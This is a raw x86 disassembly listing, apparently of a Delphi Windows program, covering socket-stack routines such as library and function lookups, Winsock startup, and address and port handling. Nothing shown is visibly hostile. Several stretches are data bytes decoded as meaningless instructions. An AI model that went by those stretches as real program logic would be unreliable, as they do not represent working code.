lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404188
retn
sub_46af57
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46bd34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46bdd7
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bdde
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_409098
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46aeb0
call sub_403b1c
sub_46bde8
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_46be0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46bed9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_409098
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46aeb0
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bee0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_46bf17
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46bf44
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf4b
retn
call sub_46af88
sub_46bf60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bf85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf8c
retn
sub_46bf98
in al 0xbf
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
mov edi 0x40046
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ 0x53644954 ] cl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add al dh
enter 0x46 0x4c
sub eax [ eax ]
dec esp
sub eax [ eax ]
dec esp
sub eax [ eax ]
cmp al 0xc3
inc esi
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add al ah
retn
imul esi [ ebx + 0x74 ] 0xc050c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
rol [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
rol [ esi ] 0x10
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
sub_46c0ba
inc esi
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ ebx + ebp + 0x40 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046c1 ] bl
arpl [ ebx - 0x70 ] bp
cmp al 0xc1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 ] bh
inc esi
add [ eax + eax ] cl
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x53644945 ] cl
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x400408d
retn 0x46
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
lea ecx [ esp + 0x4 ]
call sub_46c228
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al dh
rol [ esi ] 0x98
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x74536449 ] bl
popad
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
rcr [ eax + 0x46c1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
rol [ esi ] 0xc
sub_46c228
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_46c2dc
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_46c270
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_46c2cf
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c2d6
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_46c2dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c32e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46aac0
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c335
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_46c368
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_408218
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_46c814
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_4041b8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46c3e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_46c7da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404164
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_409098
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4041b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c7e1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
jmp [ eax * 4 + jump_table_46c420 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405fc8
sub_46c7e8
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_4084c8
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_4084c8
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_46c814
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_46c8d3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_46e170
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4041fc
mov eax [ ebp - 0x8 ]
call sub_46c7e8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_46c7e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c8da
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404188
retn
mov eax [ ebp - 0x10 ]
call sub_46c7e8
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_46c7e8
test al al
jne r-xdata
mov bl 0x1
sub_46c8f0
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_46c920
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_46c968
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c96f
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_46c978
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c99d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c9a4
retn
sub_46c9b0
cld
leave
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] cl
inc esi
add [ eax ] cl
add [ eax ] eax
add [ eax - 0x67ffb941 ] bl
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add al cl

imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
movsb [ edi ] [ esi ]
into
inc esi
add [ esi + ecx * 8 + 0x46 ] dl
add [ edx + edx * 8 - 0x2c53ffba ] ah
inc esi
add [ edx + edx * 8 - 0x311fffba ] cl
inc esi
add [ eax - 0x4bffb92e ] bl
aam 0x46
add al al
aam 0x46
add ah ch
into
inc esi
add [ eax ] cl
iretd
lea eax [ eax ]
jo r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] cl
fld [ esi ]
mov al [ 0x700046d8 ]
fld [ esi ]
add al 0xd9
inc esi
add [ esp + edx * 2 ] dl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ebx ] dh
inc eax
add [ ebx + esi ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
0x46
sub_46ca48
adc [ eax ] al
add [ eax ] al
add al 0xc0
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add al cl

sub_46ca6e
inc esi
add ah cl
aam 0x46
add [ ebp + edx * 8 + 0x46 ] dh
add [ edx + edx * 8 + 0x46 ] al
add [ ebx + ecx * 8 ] al
inc esi
add [ eax + 0x300046cc ] ah
int 0x46
add [ ebp + ecx * 8 - 0x3257ffba ] bl
inc esi
add al bh
int 0x46
add [ esi + ecx * 8 - 0x31abffba ] ah
inc esi
add [ edx + edx * 8 - 0x2c53ffba ] ah
inc esi
add [ edx + edx * 8 - 0x311fffba ] cl
inc esi
add [ eax - 0x4bffb92e ] bl
aam 0x46
add al al
aam 0x46
add ah ch
into
inc esi
add [ eax ] cl
iretd
sub_46caee
inc esi
add [ eax - 0x2a ] bl
inc esi
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46cba2
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_46c33c
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cba9
lea eax [ ebp - 0x194 ]
call sub_404164
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_46be0c
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_46cbc8
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46c8f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_46cbf0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_46cc84
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_408350
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_408350
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_408350
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_408350
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4044e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc8b
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404188
retn
sub_46cc97
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46cd1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cd26
lea eax [ ebp - 0x1c ]
call sub_404164
retn
sub_46cd30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404424
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_46c920
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46cda8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_46c920
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46cdf8
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_46c21c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46ce54
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_40435c
or edx 0xffffffff
mov eax esi
call sub_46c21c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_46cea4
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_4047b0
mov eax [ ebx ]
call sub_404424
push eax
mov eax [ ebx ]
call sub_404624
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404624
mov edx eax
mov eax ebx
call sub_40435c
pop ebx
retn
sub_46ceec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_46cf08
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46cf93
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_4041b8
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cf9a
lea eax [ ebp - 0x1c ]
call sub_404164
retn
sub_46cfa4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_418a5c
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_418744
add ebx 0x4
dec esi
jne r-xdata
sub_46cfe0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
